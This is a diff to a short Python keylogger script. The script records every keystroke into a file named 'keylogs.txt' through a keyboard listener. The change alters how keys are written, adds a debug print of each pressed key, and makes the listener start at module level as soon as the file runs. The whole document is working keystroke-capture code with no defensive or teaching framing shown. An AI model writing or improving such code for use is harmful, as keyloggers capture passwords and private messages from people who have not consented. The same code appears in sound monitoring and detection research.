@@ -5,17 +5,12 @@ def on_press(key):
     try:
         with open('keylogs.txt', 'a') as f:
             if hasattr(key, 'char'):
-                f.write(f'{key.char} ')
+                f.write(key.char)
             else:
-                f.write(f'[{str(key)}] ')
+                f.write(str(key))
+            print(f'Key {key} pressed') # Debug print statement added here
     except Exception as e:
         print(f"Error occurred: {e}")
 
-def start_logging():
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
-
-if __name__ == "__main__":
-    if not os.path.exists('keylogs.txt'):
-        open('keylogs.txt', 'w').close()
-    start_logging()
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
